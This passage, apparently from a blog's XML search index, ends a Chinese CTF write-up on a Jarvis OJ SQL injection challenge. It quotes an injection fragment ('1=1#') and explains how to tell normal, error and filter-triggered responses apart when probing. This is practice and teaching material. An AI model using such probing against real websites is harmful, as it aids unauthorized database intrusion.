1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：可以看到与id=1的时候回显一样。我在不断的错误中发现了三种情况：1.正常回显2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Jarvis OJ wp</tag>
      </tags>
  </entry>
</search>
